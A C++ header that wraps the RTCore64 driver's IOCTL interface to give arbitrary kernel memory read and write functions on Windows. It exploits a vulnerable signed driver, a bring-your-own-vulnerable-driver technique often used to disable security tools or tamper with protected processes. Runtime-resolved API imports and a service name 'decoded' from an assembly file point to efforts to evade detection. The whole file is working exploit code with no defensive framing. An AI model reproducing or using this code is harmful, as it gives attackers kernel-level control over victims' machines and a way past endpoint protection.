#pragma once
#include "includes.hpp"

//=============================================================================
//  kvc_drv.hpp  –  kvc.sys IOCTL communication layer
//
//  Translated verbatim from kvc-main / KvcDrv.h + KvcDrv.cpp
//  Provides kernel Read/Write via IOCTL to the kvc.sys helper driver.
//
//  IOCTL codes (driver-specific, must match kvc.sys):
//    RTC_IOCTL_MEMORY_READ  = 0x80002048
//    RTC_IOCTL_MEMORY_WRITE = 0x8000204C
//=============================================================================

// ─── IOCTL codes ──────────────────────────────────────────────────────────────
inline constexpr DWORD RTC_IOCTL_MEMORY_READ  = 0x80002048;
inline constexpr DWORD RTC_IOCTL_MEMORY_WRITE = 0x8000204C;

// ─── kernel memory read request (properly aligned) ────────────────────────────
struct alignas(8) RTC_MEMORY_READ
{
    BYTE    Pad0[8];
    DWORD64 Address;   // target kernel address
    BYTE    Pad1[8];
    DWORD   Size;      // bytes to read
    DWORD   Value;     // returned value
    BYTE    Pad3[16];
};

// ─── kernel memory write request (properly aligned) ───────────────────────────
struct alignas(8) RTC_MEMORY_WRITE
{
    BYTE    Pad0[8];
    DWORD64 Address;   // target kernel address
    BYTE    Pad1[8];
    DWORD   Size;      // bytes to write
    DWORD   Value;     // value to write
    BYTE    Pad3[16];
};

//=============================================================================
//  class kvc  –  mirrored exactly from KvcDrv.h / KvcDrv.cpp
//=============================================================================
class kvc
{
public:
    kvc()  = default;
    ~kvc() { Cleanup(); }

    kvc( const kvc& )             = delete;
    kvc& operator=( const kvc& ) = delete;
    kvc( kvc&& )                  noexcept = default;
    kvc& operator=( kvc&& )       noexcept = default;

    // ── connection ──────────────────────────────────────────────────────────
    bool Initialize() noexcept
    {
        if ( IsConnected() ) return true;

        if ( m_deviceName.empty() )
            m_deviceName = L"\\\\.\\" + m_svcName;

        // kvc: uses g_pCreateFileW (runtime-resolved) — we mirror that via lazy::k32.
        HANDLE h = lazy::k32::get().CreateFileW(
            m_deviceName.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0,          // no sharing
            nullptr,
            OPEN_EXISTING,
            0,
            nullptr );

        m_handle = h;
        return IsConnected();
    }

    void Cleanup() noexcept
    {
        if ( m_handle && m_handle != INVALID_HANDLE_VALUE ) {
            ::FlushFileBuffers( m_handle );
            ::CloseHandle( m_handle );
            m_handle = nullptr;
        }
        m_deviceName.clear();
    }

    bool IsConnected() const noexcept
    {
        return m_handle && m_handle != INVALID_HANDLE_VALUE;
    }

    void SetServiceName( const std::wstring& name ) { m_svcName = name; }

    // ── read operations ──────────────────────────────────────────────────────
    std::optional<BYTE> Read8( ULONG_PTR address ) noexcept
    {
        auto v = Read32( address );
        if ( !v ) return std::nullopt;
        return static_cast<BYTE>( v.value() & 0xFF );
    }

    std::optional<WORD> Read16( ULONG_PTR address ) noexcept
    {
        auto v = Read32( address );
        if ( !v ) return std::nullopt;
        return static_cast<WORD>( v.value() & 0xFFFF );
    }

    std::optional<DWORD> Read32( ULONG_PTR address ) noexcept
    {
        return ReadRaw( address, sizeof( DWORD ) );
    }

    // kvc: two 32-bit reads combined into QWORD
    std::optional<DWORD64> Read64( ULONG_PTR address ) noexcept
    {
        auto lo = Read32( address );
        auto hi = Read32( address + 4 );
        if ( !lo || !hi ) return std::nullopt;
        return ( static_cast<DWORD64>( hi.value() ) << 32 ) | lo.value();
    }

    std::optional<ULONG_PTR> ReadPtr( ULONG_PTR address ) noexcept
    {
#ifdef _WIN64
        auto v = Read64( address );
        if ( !v ) return std::nullopt;
        return static_cast<ULONG_PTR>( v.value() );
#else
        auto v = Read32( address );
        if ( !v ) return std::nullopt;
        return static_cast<ULONG_PTR>( v.value() );
#endif
    }

    // ── write operations ─────────────────────────────────────────────────────
    bool Write8 ( ULONG_PTR address, BYTE   value ) noexcept { return WriteRaw( address, sizeof( value ), value ); }
    bool Write16( ULONG_PTR address, WORD   value ) noexcept { return WriteRaw( address, sizeof( value ), value ); }
    bool Write32( ULONG_PTR address, DWORD  value ) noexcept { return WriteRaw( address, sizeof( value ), value ); }

    // kvc: two 32-bit writes (non-atomic — matches original exactly)
    bool Write64( ULONG_PTR address, DWORD64 value ) noexcept
    {
        const DWORD lo = static_cast<DWORD>( value & 0xFFFFFFFF );
        const DWORD hi = static_cast<DWORD>( ( value >> 32 ) & 0xFFFFFFFF );
        return Write32( address, lo ) && Write32( address + 4, hi );
    }

private:
    HANDLE       m_handle     = nullptr;
    std::wstring m_deviceName;
    std::wstring m_svcName    = L"RTCore64"; // decoded from MmPoolTelemetry.asm

    // ── raw IOCTL helpers ────────────────────────────────────────────────────
    std::optional<DWORD> ReadRaw( ULONG_PTR address, DWORD size ) noexcept
    {
        RTC_MEMORY_READ req{};
        req.Address = address;
        req.Size    = size;

        if ( !Initialize() ) return std::nullopt;

        DWORD returned = 0;
        BOOL ok = lazy::k32::get().DeviceIoControl(
            m_handle,
            RTC_IOCTL_MEMORY_READ,
            &req, sizeof( req ),
            &req, sizeof( req ),   // in-place: driver writes Value into req
            &returned, nullptr );

        if ( !ok ) return std::nullopt;
        return req.Value;
    }

    bool WriteRaw( ULONG_PTR address, DWORD size, DWORD value ) noexcept
    {
        RTC_MEMORY_WRITE req{};
        req.Address = address;
        req.Size    = size;
        req.Value   = value;

        if ( !Initialize() ) return false;

        DWORD returned = 0;
        return lazy::k32::get().DeviceIoControl(
            m_handle,
            RTC_IOCTL_MEMORY_WRITE,
            &req, sizeof( req ),
            &req, sizeof( req ),
            &returned, nullptr ) != FALSE;
    }
};
